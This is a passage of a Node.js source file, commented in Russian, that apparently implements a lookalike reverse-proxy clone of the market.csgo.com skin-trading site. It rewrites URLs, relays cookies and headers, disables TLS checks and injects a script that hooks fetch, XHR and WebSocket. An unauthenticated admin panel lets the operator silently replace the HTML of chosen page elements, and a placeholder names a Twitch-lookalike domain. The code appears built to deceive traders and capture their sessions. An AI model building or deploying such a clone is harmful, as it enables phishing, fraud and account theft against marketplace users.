const express = require('express');
const axios = require('axios');
const cookieParser = require('cookie-parser');
const compression = require('compression');
const WebSocket = require('ws');
const url = require('url');
const http = require('http');
const https = require('https');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;
const TARGET_HOST = 'https://market.csgo.com';
const WS_TARGET = 'wss://centrifugo2.csgotrader.app';

// Создаем HTTP сервер
const server = http.createServer(app);

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(cookieParser());
app.use(compression());

// Хранилище для cookies и токенов
const sessions = new Map();

// НОВОЕ: Хранилище для модифицированных страниц
const customPages = new Map();

// НОВОЕ: Функция для сохранения и загрузки кастомных страниц
const CUSTOM_PAGES_FILE = path.join(__dirname, 'custom_pages.json');

// НОВОЕ: Загрузка сохраненных настроек при запуске
function loadCustomPages() {
    try {
        if (fs.existsSync(CUSTOM_PAGES_FILE)) {
            const data = fs.readFileSync(CUSTOM_PAGES_FILE, 'utf8');
            const parsed = JSON.parse(data);
            
            // Преобразуем массив обратно в Map
            parsed.forEach(item => {
                customPages.set(item.url, {
                    selector: item.selector,
                    value: item.value,
                    timestamp: item.timestamp
                });
            });
            
            console.log(`📄 Loaded ${customPages.size} custom page modifications`);
        }
    } catch (error) {
        console.error('Error loading custom pages:', error);
    }
}

// НОВОЕ: Сохранение настроек
function saveCustomPages() {
    try {
        // Преобразуем Map в массив для сохранения
        const data = Array.from(customPages.entries()).map(([url, config]) => ({
            url,
            selector: config.selector,
            value: config.value,
            timestamp: config.timestamp
        }));
        
        fs.writeFileSync(CUSTOM_PAGES_FILE, JSON.stringify(data, null, 2), 'utf8');
        console.log(`📄 Saved ${customPages.size} custom page modifications`);
    } catch (error) {
        console.error('Error saving custom pages:', error);
    }
}

// Загружаем настройки при запуске
loadCustomPages();

// Создаем агент для HTTPS с игнорированием сертификатов
const httpsAgent = new https.Agent({
    rejectUnauthorized: false,
    keepAlive: true
});

// Определяем, используется ли HTTPS
function isSecure(req) {
    return req.headers['x-forwarded-proto'] === 'https' || 
           req.headers['cloudfront-forwarded-proto'] === 'https' ||
           req.protocol === 'https' ||
           req.secure;
}

// Функция для получения базового URL с правильным протоколом
function getBaseUrl(req) {
    const protocol = isSecure(req) ? 'https' : 'http';
    const host = req.headers['x-forwarded-host'] || req.headers['host'] || req.get('host');
    return `${protocol}://${host}`;
}

// Middleware для принудительного HTTPS и CORS
app.use((req, res, next) => {
    // Установка CORS заголовков
    const origin = req.headers.origin || '*';
    res.header('Access-Control-Allow-Origin', origin);
    res.header('Access-Control-Allow-Credentials', 'true');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, HEAD, PATCH');
    res.header('Access-Control-Allow-Headers', '*');
    res.header('Access-Control-Expose-Headers', '*');
    
    // Опции для CORS preflight
    if (req.method === 'OPTIONS') {
        return res.status(204).end();
    }
    
    // Если запрос по HTTP, но от Render/Cloudflare по HTTPS
    if (isSecure(req) || req.headers['x-forwarded-proto'] === 'https') {
        res.setHeader('Content-Security-Policy', "upgrade-insecure-requests");
    }
    
    next();
});

// Получение или создание сессии
function getSession(sessionId) {
    if (!sessions.has(sessionId)) {
        sessions.set(sessionId, {
            cookies: new Map(),
            tokens: new Map(),
            wsToken: null,
            lastAccess: Date.now()
        });
    }
    
    // Обновляем время последнего доступа
    const session = sessions.get(sessionId);
    session.lastAccess = Date.now();
    
    return session;
}

// Парсинг cookies из заголовков
function parseCookieHeader(cookieHeader) {
    const cookies = new Map();
    if (cookieHeader) {
        cookieHeader.split(';').forEach(cookie => {
            const [name, ...rest] = cookie.trim().split('=');
            if (name && rest.length > 0) {
                cookies.set(name, rest.join('='));
            }
        });
    }
    return cookies;
}

// Обработка set-cookie заголовков
function parseSetCookieHeaders(setCookieHeaders) {
    const cookies = new Map();
    if (Array.isArray(setCookieHeaders)) {
        setCookieHeaders.forEach(cookie => {
            const [nameValue] = cookie.split(';');
            const [name, ...valueParts] = nameValue.split('=');
            if (name && valueParts.length > 0) {
                cookies.set(name.trim(), valueParts.join('='));
            }
        });
    }
    return cookies;
}

// Создание строки cookies для запроса
function createCookieString(cookieMap) {
    return Array.from(cookieMap.entries())
        .map(([name, value]) => `${name}=${value}`)
        .join('; ');
}

// Модификация URL в контенте
function modifyUrls(content, baseUrl, contentType = '') {
    if (!content) return content;
    
    let modified = content.toString();
    
    // Определяем протокол для замены
    const isHttps = baseUrl.startsWith('https');
    const wsProtocol = isHttps ? 'wss' : 'ws';
    const hostWithoutProtocol = baseUrl.replace(/^https?:\/\//, '');
    
    // Основные замены для всех типов контента
    modified = modified.replace(/https:\/\/market\.csgo\.com/g, baseUrl);
    modified = modified.replace(/http:\/\/market\.csgo\.com/g, baseUrl);
    modified = modified.replace(/\/\/market\.csgo\.com/g, baseUrl);
    
    // WebSocket URL (корректная замена без дублирования протокола)
    modified = modified.replace(/wss:\/\/centrifugo2\.csgotrader\.app/g, `${wsProtocol}://${hostWithoutProtocol}/ws`);
    
    // Поддержка различных форматов GraphQL URL
    modified = modified.replace(/https:\/\/market\.csgo\.com\/api\/graphql/g, `${baseUrl}/api/graphql`);
    
    // Специфичные замены для HTML
    if (contentType.includes('html')) {
        // Добавляем meta тег для upgrade-insecure-requests
        if (!modified.includes('upgrade-insecure-requests')) {
            modified = modified.replace(/<head[^>]*>/i, `$&<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">`);
        }
        
        // Добавляем base тег
        if (!modified.includes('<base')) {
            modified = modified.replace(/<head[^>]*>/i, `$&<base href="${baseUrl}/">`);
        }
        
        // Инжектим улучшенный прокси скрипт с исправленной обработкой WebSocket
        const proxyScript = `
        <script>
        (function() {
            console.log('🔧 Market proxy initialized (HTTPS mode) - Improved Version');
            
            // Сохраняем оригинальные функции
            const originalFetch = window.fetch;
            const originalXHR = XMLHttpRequest.prototype.open;
            const originalWS = window.WebSocket;
            
            // Текущий протокол
            const currentProtocol = window.location.protocol;
            const isHttps = currentProtocol === 'https:';
            const wsProtocol = isHttps ? 'wss:' : 'ws:';
            
            // Модификация URL
            function modifyUrl(url) {
                if (!url) return url;
                
                try {
                    // Если уже наш домен
                    if (url.includes(window.location.host)) {
                        return url;
                    }
                    
                    // Принудительно HTTPS для всех запросов если страница по HTTPS
                    if (isHttps && url.startsWith('http://')) {
                        url = url.replace('http://', 'https://');
                    }
                    
                    // WebSocket URLs - правильная обработка без дублирования протокола
                    if (url.includes('centrifugo2.csgotrader.app')) {
                        return wsProtocol + '//' + window.location.host + '/ws' + 
                               (url.includes('/connection/websocket') ? '/connection/websocket' : '');
                    }
                    
                    // API URLs
                    if (url.includes('market.csgo.com')) {
                        return url.replace(/https?:\\/\\/market\\.csgo\\.com/, 
                            currentProtocol + '//' + window.location.host);
                    }
                    
                    // Относительные URLs
                    if (url.startsWith('/') && !url.startsWith('//')) {
                        return window.location.origin + url;
                    }
                    
                    return url;
                } catch (e) {
                    console.error('URL modification error:', e);
                    return url; // В случае ошибки возвращаем исходный URL
                }
            }
            
            // Добавлен обработчик ошибок при выполнении запросов
            function safeExecute(fn, ...args) {
                try {
                    return fn(...args);
                } catch (error) {
                    console.error('Proxy execution error:', error);
                    return args[args.length - 1]; // Возвращаем последний аргумент (обычно оригинальный URL)
                }
            }
            
            // Перехват fetch с улучшенной обработкой ошибок
            window.fetch = async function(input, init = {}) {
                try {
                    let url = input;
                    if (typeof input === 'string') {
                        url = modifyUrl(input);
                    } else if (input instanceof Request) {
                        url = new Request(modifyUrl(input.url), input);
                    }
                    
                    // Добавляем credentials для корректной работы cookies
                    init.credentials = init.credentials || 'include';
                    
                    // Добавлено специальное логирование для GraphQL запросов
                    if (typeof input === 'string' && (
                        input.includes('/api/graphql') || 
                        input.includes('/graphql')
                    )) {
                        console.log('GraphQL Fetch:', url);
                    }
                    
                    return originalFetch.call(this, url, init);
                } catch (e) {
                    console.error('Fetch proxy error:', e);
                    return originalFetch.call(this, input, init); // В случае ошибки используем оригинальный запрос
                }
            };
            
            // Перехват XMLHttpRequest с улучшенной обработкой ошибок
            XMLHttpRequest.prototype.open = function(method, url, ...args) {
                try {
                    const modifiedUrl = modifyUrl(url);
                    
                    // Добавлено специальное логирование для GraphQL запросов
                    if (url && (url.includes('/api/graphql') || url.includes('/graphql'))) {
                        console.log('GraphQL XHR:', method, modifiedUrl);
                    }
                    
                    return originalXHR.call(this, method, modifiedUrl, ...args);
                } catch (e) {
                    console.error('XHR proxy error:', e);
                    return originalXHR.call(this, method, url, ...args); // В случае ошибки используем оригинальный URL
                }
            };
            
            // Перехват WebSocket с улучшенной обработкой и логированием
            window.WebSocket = function(url, protocols) {
                try {
                    const modifiedUrl = modifyUrl(url);
                    console.log('WebSocket connection:', modifiedUrl);
                    
                    // Проверка на корректность URL перед созданием WebSocket
                    if (!modifiedUrl || !modifiedUrl.startsWith(wsProtocol)) {
                        console.warn('Invalid WebSocket URL, using original:', url);
                        return new originalWS(url, protocols);
                    }
                    
                    return new originalWS(modifiedUrl, protocols);
                } catch (e) {
                    console.error('WebSocket proxy error:', e);
                    return new originalWS(url, protocols); // В случае ошибки используем оригинальный URL
                }
            };
            
            // Перехват EventSource если используется
            if (window.EventSource) {
                const originalES = window.EventSource;
                window.EventSource = function(url, config) {
                    try {
                        const modifiedUrl = modifyUrl(url);
                        console.log('EventSource:', modifiedUrl);
                        return new originalES(modifiedUrl, config);
                    } catch (e) {
                        console.error('EventSource proxy error:', e);
                        return new originalES(url, config); // В случае ошибки используем оригинальный URL
                    }
                };
            }
            
            // Улучшенный перехват создания тегов для лучшей работы с внешними ресурсами
            const originalCreateElement = document.createElement;
            document.createElement = function(tagName) {
                const element = originalCreateElement.call(this, tagName);
                
                if (tagName.toLowerCase() === 'script' || tagName.toLowerCase() === 'link' || tagName.toLowerCase() === 'img') {
                    const originalSetAttribute = element.setAttribute;
                    element.setAttribute = function(name, value) {
                        try {
                            if ((name === 'src' || name === 'href') && value) {
                                const modifiedValue = modifyUrl(value);
                                return originalSetAttribute.call(this, name, modifiedValue);
                            }
                        } catch (e) {
                            console.error('Element attribute proxy error:', e);
                        }
                        return originalSetAttribute.call(this, name, value);
                    };
                    
                    // Перехват изменения src у тега script
                    if (tagName.toLowerCase() === 'script' && element.src !== undefined) {
                        Object.defineProperty(element, 'src', {
                            get: function() {
                                return this.getAttribute('src');
                            },
                            set: function(value) {
                                try {
                                    this.setAttribute('src', modifyUrl(value));
                                } catch (e) {
                                    this.setAttribute('src', value);
                                }
                            }
                        });
                    }
                }
                
                return element;
            };
            
            // Добавлен обработчик для перехвата adblocker
            function handlePotentiallyBlockedElement(elem) {
                try {
                    if (elem && elem.tagName && (elem.tagName.toLowerCase() === 'script' || elem.tagName.toLowerCase() === 'img' || elem.tagName.toLowerCase() === 'iframe')) {
                        // Если элемент был заблокирован, мы пытаемся обойти блокировку
                        elem.setAttribute('data-proxy-managed', 'true');
                        
                        // Для скриптов можно попробовать загрузить через прокси
                        if (elem.tagName.toLowerCase() === 'script' && elem.src) {
                            const origSrc = elem.src;
                            if (origSrc.includes('facebook') || origSrc.includes('twitter') || origSrc.includes('ads')) {
                                console.log('Potentially blocked resource:', origSrc);
                                // Удаляем атрибуты, которые могут вызвать блокировку
                                elem.removeAttribute('data-ad');
                                elem.removeAttribute('data-analytics');
                            }
                        }
                    }
                } catch (e) {
                    console.error('AdBlock handler error:', e);
                }
            }
            
            // Мониторинг создания DOM элементов для отлова блокировок
            const observer = new MutationObserver((mutations) => {
                mutations.forEach((mutation) => {
                    if (mutation.type === 'childList') {
                        mutation.addedNodes.forEach((node) => {
                            if (node.nodeType === 1) { // Элемент
                                handlePotentiallyBlockedElement(node);
                            }
                        });
                    }
                });
            });
            
            // Запускаем наблюдение за DOM
            observer.observe(document, { childList: true, subtree: true });
            
            // Добавлен обработчик ошибок для WebSocket
            window.addEventListener('error', function(event) {
                if (event && event.target && event.target.tagName === 'SCRIPT') {
                    console.log('Script load error:', event.target.src);
                }
                
                // Специфичная обработка для ошибок WebSocket
                if (event && event.message && event.message.includes('WebSocket')) {
                    console.warn('WebSocket error detected:', event.message);
                }
            }, true);
            
            // НОВОЕ: Функционал для обработки кастомных модификаций страницы
            function applyCustomModifications() {
                // Проверяем, есть ли для текущей страницы кастомные настройки
                fetch('/admin-api/check-custom-page?url=' + encodeURIComponent(window.location.href))
                    .then(response => response.json())
                    .then(data => {
                        if (data.hasCustomizations) {
                            console.log('Applying custom modifications for this page');
                            
                            // Запрашиваем детали настроек
                            return fetch('/admin-api/get-custom-page?url=' + encodeURIComponent(window.location.href))
                                .then(response => response.json());
                        }
                        return null;
                    })
                    .then(customization => {
                        if (customization && customization.selector) {
                            // Функция для применения изменений через интервал
                            // (чтобы быть уверенным, что DOM загрузился полностью)
                            const applyChanges = () => {
                                try {
                                    const elements = document.querySelectorAll(customization.selector);
                                    if (elements && elements.length > 0) {
                                        console.log('Found', elements.length, 'elements matching selector');
                                        
                                        elements.forEach((el, index) => {
                                            console.log('Modifying element', index + 1);
                                            el.innerHTML = customization.value;
                                            
                                            // Модифицируем элемент без визуальной подсветки
                                            // Добавляем только скрытый маркер для отладки
                                            el.setAttribute('data-modified', 'true');
                                        });
                                        
                                        // Если нашли хотя бы один элемент, останавливаем интервал
                                        clearInterval(checkInterval);
                                    }
                                } catch (error) {
                                    console.error('Error applying custom modifications:', error);
                                }
                            };
                            
                            // Пытаемся применить изменения сразу
                            applyChanges();
                            
                            // И еще несколько раз через интервал для страниц с динамической загрузкой
                            const checkInterval = setInterval(applyChanges, 1000);
                            
                            // Остановим интервал через 10 секунд в любом случае
                            setTimeout(() => {
                                clearInterval(checkInterval);
                            }, 10000);
                        }
                    })
                    .catch(error => {
                        console.error('Error checking for custom modifications:', error);
                    });
            }
            
            // Запускаем проверку кастомных модификаций при загрузке страницы
            document.addEventListener('DOMContentLoaded', applyCustomModifications);
            
            // Также проверяем через 1 секунду после загрузки для динамических страниц
            setTimeout(applyCustomModifications, 1000);
            
            console.log('🔧 Proxy initialized successfully with enhanced error handling and custom modifications support');
        })();
        </script>
        `;
        
        modified = modified.replace(/<head[^>]*>/i, `$&${proxyScript}`);
    }
    
    // Специфичные замены для JavaScript
    if (contentType.includes('javascript')) {
        modified = modified.replace(/"\/api\//g, `"${baseUrl}/api/`);
        modified = modified.replace(/'\/api\//g, `'${baseUrl}/api/`);
        
        // Корректная замена WebSocket URLs в JavaScript
        modified = modified.replace(/centrifugo2\.csgotrader\.app/g, 
            hostWithoutProtocol + '/ws');
            
        // Улучшена обработка GraphQL URLs
        modified = modified.replace(/['"]https:\/\/market\.csgo\.com\/api\/graphql['"]/g, 
            `'${baseUrl}/api/graphql'`);
            
        // Добавлена обработка GQL ошибок
        if (modified.includes('GQL fail') || modified.includes('viewItem')) {
            modified = modified.replace(/console\.error\(['"]GQL fail/g, 
                'console.warn("GQL fail handled:" + ');
        }
    }
    
    // Специфичные замены для CSS
    if (contentType.includes('css')) {
        modified = modified.replace(/url\(['"]?\//g, `url('${baseUrl}/`);
        modified = modified.replace(/url\(['"]?http:\/\//g, `url('${baseUrl.replace('https:', 'http:')}/`);
    }
    
    return modified;
}

// Обработка WebSocket прокси
const wsProxy = new WebSocket.Server({ noServer: true });

server.on('upgrade', (request, socket, head) => {
    const pathname = url.parse(request.url).pathname;
    
    // Улучшена обработка WebSocket путей
    if (pathname === '/ws' || pathname.startsWith('/ws/') || pathname.includes('connection/websocket')) {
        wsProxy.handleUpgrade(request, socket, head, (ws) => {
            handleWebSocketProxy(ws, request);
        });
    }
});

// Улучшена функция обработки WebSocket соединений
function handleWebSocketProxy(clientWs, request) {
    try {
        // Корректное построение целевого URL
        let wsPath = request.url.replace('/ws', '');
        if (!wsPath.includes('connection/websocket')) {
            wsPath += '/connection/websocket';
        }
        
        const targetUrl = WS_TARGET + wsPath;
        console.log('WebSocket proxy:', targetUrl);
        
        // Добавлены более надежные заголовки для WebSocket соединения
        const targetWs = new WebSocket(targetUrl, {
            headers: {
                'Origin': 'https://market.csgo.com',
                'User-Agent': request.headers['user-agent'] || 'Mozilla/5.0',
                'Accept-Language': 'en-US,en;q=0.9',
                'Pragma': 'no-cache',
                'Cache-Control': 'no-cache',
                ...request.headers
            },
            followRedirects: true
        });
        
        let isConnected = false;
        
        targetWs.on('open', () => {
            isConnected = true;
            console.log('Target WebSocket connected successfully');
        });
        
        // Client -> Server с обработкой ошибок
        clientWs.on('message', (message) => {
            try {
                if (targetWs.readyState === WebSocket.OPEN) {
                    targetWs.send(message);
                } else if (!isConnected) {
                    console.warn('Target WebSocket not ready, buffering message...');
                    // Можно добавить буферизацию сообщений
                }
            } catch (err) {
                console.error('Error sending message to target:', err.message);
            }
        });
        
        // Server -> Client с обработкой ошибок
        targetWs.on('message', (message) => {
            try {
                if (clientWs.readyState === WebSocket.OPEN) {
                    clientWs.send(message);
                }
            } catch (err) {
                console.error('Error sending message to client:', err.message);
            }
        });
        
        // Обработка закрытия соединений
        clientWs.on('close', (code, reason) => {
            console.log(`Client WebSocket closed: ${code} ${reason}`);
            if (targetWs.readyState === WebSocket.OPEN || 
                targetWs.readyState === WebSocket.CONNECTING) {
                targetWs.close(code, reason);
            }
        });
        
        targetWs.on('close', (code, reason) => {
            console.log(`Target WebSocket closed: ${code} ${reason}`);
            if (clientWs.readyState === WebSocket.OPEN) {
                clientWs.close(code, reason);
            }
        });
        
        // Обработка ошибок соединений
        clientWs.on('error', (err) => {
            console.error('Client WebSocket error:', err.message);
            if (targetWs.readyState === WebSocket.OPEN || 
                targetWs.readyState === WebSocket.CONNECTING) {
                targetWs.close(1011, 'Client error');
            }
        });
        
        targetWs.on('error', (err) => {
            console.error('Target WebSocket error:', err.message);
            // Попытка переподключения при ошибке
            if (clientWs.readyState === WebSocket.OPEN) {
                clientWs.send(JSON.stringify({
                    type: 'error',
                    message: 'Connection to server failed, attempting to reconnect...'
                }));
            }
        });
        
    } catch (error) {
        console.error('WebSocket proxy setup error:', error.message);
        if (clientWs.readyState === WebSocket.OPEN) {
            clientWs.close(1011, 'WebSocket proxy error');
        }
    }
}

// НОВОЕ: Админ API для проверки кастомных страниц
app.get('/admin-api/check-custom-page', (req, res) => {
    const urlToCheck = req.query.url;
    
    if (!urlToCheck) {
        return res.status(400).json({ error: 'URL parameter is required' });
    }
    
    // Проверяем, есть ли для этого URL настройки
    const hasCustomizations = customPages.has(urlToCheck);
    
    res.json({ hasCustomizations });
});

// НОВОЕ: Админ API для получения настроек кастомной страницы
app.get('/admin-api/get-custom-page', (req, res) => {
    const urlToCheck = req.query.url;
    
    if (!urlToCheck) {
        return res.status(400).json({ error: 'URL parameter is required' });
    }
    
    // Получаем настройки для URL
    const customization = customPages.get(urlToCheck);
    
    if (!customization) {
        return res.status(404).json({ error: 'Custom page configuration not found' });
    }
    
    res.json(customization);
});

// НОВОЕ: Админ API для сохранения настроек кастомной страницы
app.post('/admin-api/save-custom-page', express.json(), (req, res) => {
    const { url, selector, value } = req.body;
    
    if (!url || !selector || value === undefined) {
        return res.status(400).json({ error: 'URL, selector, and value are required' });
    }
    
    // Сохраняем настройки
    customPages.set(url, {
        selector,
        value,
        timestamp: Date.now()
    });
    
    // Сохраняем в файл
    saveCustomPages();
    
    res.json({ success: true, message: 'Custom page configuration saved' });
});

// НОВОЕ: Админ API для удаления настроек кастомной страницы
app.post('/admin-api/delete-custom-page', express.json(), (req, res) => {
    const { url } = req.body;
    
    if (!url) {
        return res.status(400).json({ error: 'URL parameter is required' });
    }
    
    // Удаляем настройки
    const deleted = customPages.delete(url);
    
    // Сохраняем изменения
    saveCustomPages();
    
    if (deleted) {
        res.json({ success: true, message: 'Custom page configuration deleted' });
    } else {
        res.status(404).json({ error: 'Custom page configuration not found' });
    }
});

// НОВОЕ: Админ API для сброса всех настроек кастомных страниц
app.post('/admin-api/reset-all-custom-pages', express.json(), (req, res) => {
    try {
        // Очищаем все кастомные страницы
        customPages.clear();
        
        // Сохраняем изменения
        saveCustomPages();
        
        res.json({ success: true, message: 'All custom page configurations have been reset' });
    } catch (error) {
        console.error('Error resetting custom pages:', error);
        res.status(500).json({ error: 'Internal server error while resetting custom pages' });
    }
});

// НОВОЕ: Админ API для получения списка всех кастомных страниц
app.get('/admin-api/list-custom-pages', (req, res) => {
    const list = Array.from(customPages.entries()).map(([url, config]) => ({
        url,
        selector: config.selector,
        value: config.value,
        timestamp: config.timestamp
    }));
    
    res.json(list);
});

// НОВОЕ: Админ-панель
app.get('/adminka', (req, res) => {
    // HTML для админ-панели
    const html = `
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Админ-панель CSGO Market Proxy</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
        <style>
            body {
                padding: 20px;
                background-color: #f8f9fa;
            }
            .card {
                margin-bottom: 20px;
                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            }
            .form-control {
                margin-bottom: 15px;
            }
            .list-group-item {
                display: flex;
                justify-content: space-between;
                align-items: center;
            }
            .badge {
                font-size: 0.8em;
            }
            .value-preview {
                max-width: 150px;
                overflow: hidden;
                text-overflow: ellipsis;
                white-space: nowrap;
            }
            .actions {
                display: flex;
                gap: 5px;
            }
            .modified-time {
                font-size: 0.8em;
                color: #6c757d;
            }
            .url-preview {
                max-width: 250px;
                overflow: hidden;
                text-overflow: ellipsis;
                white-space: nowrap;
            }
            .toast-container {
                position: fixed;
                top: 20px;
                right: 20px;
                z-index: 1000;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1 class="mb-4">Админ-панель CSGO Market Proxy</h1>
            
            <div class="row">
                <div class="col-md-6">
                    <div class="card">
                        <div class="card-header bg-primary text-white">
                            <h5 class="card-title mb-0">Добавить/Изменить настройки страницы</h5>
                        </div>
                        <div class="card-body">
                            <form id="customPageForm">
                                <div class="mb-3">
                                    <label for="pageUrl" class="form-label">URL страницы</label>
                                    <input type="text" class="form-control" id="pageUrl" placeholder="https://twtichcs.live/ru/Rifle/AK-47/..." required>
                                    <div class="form-text">Полный URL страницы, которую хотите модифицировать</div>
                                </div>
                                
                                <div class="mb-3">
                                    <label for="cssSelector" class="form-label">CSS селектор</label>
                                    <input type="text" class="form-control" id="cssSelector" placeholder="#app > app-main-site > div > ..." required>
                                    <div class="form-text">CSS селектор элемента, значение которого нужно изменить</div>
                                </div>
                                
                                <div class="mb-3">
                                    <label for="customValue" class="form-label">Новое значение</label>
                                    <textarea class="form-control" id="customValue" rows="3" placeholder="Введите новое значение..." required></textarea>
                                    <div class="form-text">HTML-код или текст, который будет отображаться в выбранном элементе</div>
                                </div>
                                
                                <button type="submit" class="btn btn-primary">Сохранить</button>
                                <button type="button" id="testButton" class="btn btn-outline-secondary ms-2">Проверить селектор</button>
                            </form>
                        </div>
                    </div>
                </div>
                
                <div class="col-md-6">
                    <div class="card">
                        <div class="card-header bg-info text-white d-flex justify-content-between align-items-center">
                            <h5 class="card-title mb-0">Список модифицированных страниц</h5>
                            <button type="button" id="resetAllBtn" class="btn btn-sm btn-outline-light">Сбросить все</button>
                        </div>
                        <div class="card-body">
                            <div class="list-group" id="customPagesList">
                                <div class="text-center py-4 text-muted">
                                    <div class="spinner-border spinner-border-sm" role="status">
                                        <span class="visually-hidden">Загрузка...</span>
                                    </div>
                                    Загрузка списка...
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Modal для подтверждения удаления -->
        <div class="modal fade" id="deleteModal" tabindex="-1">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header bg-danger text-white">
                        <h5 class="modal-title">Подтверждение удаления</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <p>Вы уверены, что хотите удалить настройки для страницы?</p>
                        <p id="deleteModalUrl" class="text-break small"></p>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Отмена</button>
                        <button type="button" class="btn btn-danger" id="confirmDelete">Удалить</button>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Modal для просмотра деталей -->
        <div class="modal fade" id="detailsModal" tabindex="-1">
            <div class="modal-dialog modal-lg">
                <div class="modal-content">
                    <div class="modal-header bg-primary text-white">
                        <h5 class="modal-title">Детали модификации</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <div class="mb-3">
                            <label class="form-label fw-bold">URL:</label>
                            <div id="detailUrl" class="text-break"></div>
                        </div>
                        <div class="mb-3">
                            <label class="form-label fw-bold">CSS селектор:</label>
                            <div id="detailSelector" class="text-break"></div>
                        </div>
                        <div class="mb-3">
                            <label class="form-label fw-bold">Значение:</label>
                            <div id="detailValue" class="border p-2 bg-light"></div>
                        </div>
                        <div class="mb-3">
                            <label class="form-label fw-bold">Дата изменения:</label>
                            <div id="detailTimestamp"></div>
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Закрыть</button>
                        <a href="#" class="btn btn-primary" id="viewPageBtn" target="_blank">Открыть страницу</a>
                        <button type="button" class="btn btn-warning" id="editItemBtn">Редактировать</button>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Modal для подтверждения сброса всех настроек -->
        <div class="modal fade" id="resetAllModal" tabindex="-1">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header bg-danger text-white">
                        <h5 class="modal-title">Подтверждение сброса</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <p><strong>Вы уверены, что хотите сбросить ВСЕ модификации?</strong></p>
                        <p>Это действие нельзя отменить. Все модификации будут удалены.</p>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Отмена</button>
                        <button type="button" class="btn btn-danger" id="confirmResetAll">Сбросить все</button>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Система уведомлений -->
        <div class="toast-container"></div>
        
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
        <script>
            // Глобальные переменные
            let deleteUrl = '';
            let customPagesList = [];
            
            // DOM элементы
            const form = document.getElementById('customPageForm');
            const pageUrlInput = document.getElementById('pageUrl');
            const cssSelectorInput = document.getElementById('cssSelector');
            const customValueInput = document.getElementById('customValue');
            const customPagesListEl = document.getElementById('customPagesList');
            const deleteModal = new bootstrap.Modal(document.getElementById('deleteModal'));
            const detailsModal = new bootstrap.Modal(document.getElementById('detailsModal'));
            const resetAllModal = new bootstrap.Modal(document.getElementById('resetAllModal'));
            const confirmDeleteBtn = document.getElementById('confirmDelete');
            const confirmResetAllBtn = document.getElementById('confirmResetAll');
            const resetAllBtn = document.getElementById('resetAllBtn');
            const testButton = document.getElementById('testButton');
            
            // Функция для показа уведомлений
            function showToast(message, type = 'success') {
                const toastContainer = document.querySelector('.toast-container');
                
                const toastEl = document.createElement('div');
                toastEl.className = \`toast align-items-center text-white bg-\${type}\`;
                toastEl.setAttribute('role', 'alert');
                toastEl.setAttribute('aria-live', 'assertive');
                toastEl.setAttribute('aria-atomic', 'true');
                
                toastEl.innerHTML = \`
                    <div class="d-flex">
                        <div class="toast-body">
                            \${message}
                        </div>
                        <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast" aria-label="Close"></button>
                    </div>
                \`;
                
                toastContainer.appendChild(toastEl);
                
                const toast = new bootstrap.Toast(toastEl, {
                    autohide: true,
                    delay: 3000
                });
                
                toast.show();
                
                // Удаляем элемент после скрытия
                toastEl.addEventListener('hidden.bs.toast', () => {
                    toastEl.remove();
                });
            }
            
            // Форматирование даты
            function formatDate(timestamp) {
                if (!timestamp) return 'Неизвестно';
                
                const date = new Date(timestamp);
                return date.toLocaleString('ru-RU', {
                    year: 'numeric',
                    month: 'numeric',
                    day: 'numeric',
                    hour: '2-digit',
                    minute: '2-digit',
                    second: '2-digit'
                });
            }
            
            // Загрузка списка модифицированных страниц
            async function loadCustomPages() {
                try {
                    const response = await fetch('/admin-api/list-custom-pages');
                    if (!response.ok) throw new Error('Ошибка при загрузке списка');
                    
                    customPagesList = await response.json();
                    renderCustomPagesList();
                } catch (error) {
                    console.error('Ошибка загрузки:', error);
                    customPagesListEl.innerHTML = \`
                        <div class="alert alert-danger">
                            Ошибка при загрузке списка: \${error.message}
                        </div>
                    \`;
                }
            }
            
            // Отображение списка модифицированных страниц
            function renderCustomPagesList() {
                if (customPagesList.length === 0) {
                    customPagesListEl.innerHTML = \`
                        <div class="text-center py-4 text-muted">
                            <i class="bi bi-info-circle"></i>
                            Нет модифицированных страниц
                        </div>
                    \`;
                    return;
                }
                
                customPagesListEl.innerHTML = '';
                
                // Сортируем по дате изменения (сначала новые)
                customPagesList.sort((a, b) => b.timestamp - a.timestamp);
                
                customPagesList.forEach(item => {
                    const listItem = document.createElement('div');
                    listItem.className = 'list-group-item';
                    
                    listItem.innerHTML = \`
                        <div class="ms-2 me-auto">
                            <div class="d-flex align-items-center">
                                <div class="url-preview" title="\${item.url}">\${item.url}</div>
                                <span class="badge bg-primary ms-2">\${item.selector}</span>
                            </div>
                            <div class="d-flex justify-content-between align-items-center mt-1">
                                <div class="value-preview" title="\${item.value}">\${item.value}</div>
                                <div class="modified-time">\${formatDate(item.timestamp)}</div>
                            </div>
                        </div>
                        <div class="actions">
                            <button class="btn btn-sm btn-info view-btn" data-url="\${item.url}">
